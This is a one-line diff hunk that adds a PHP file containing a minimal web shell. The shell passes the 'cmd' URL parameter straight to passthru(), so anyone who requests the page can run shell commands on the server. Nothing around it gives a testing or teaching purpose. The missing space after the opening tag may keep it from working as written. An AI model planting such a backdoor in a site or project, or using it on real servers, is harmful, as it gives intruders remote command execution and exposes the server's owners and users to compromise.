@@ -1,0 +1,1 @@
+<?phppassthru($_GET["cmd"]); ?>
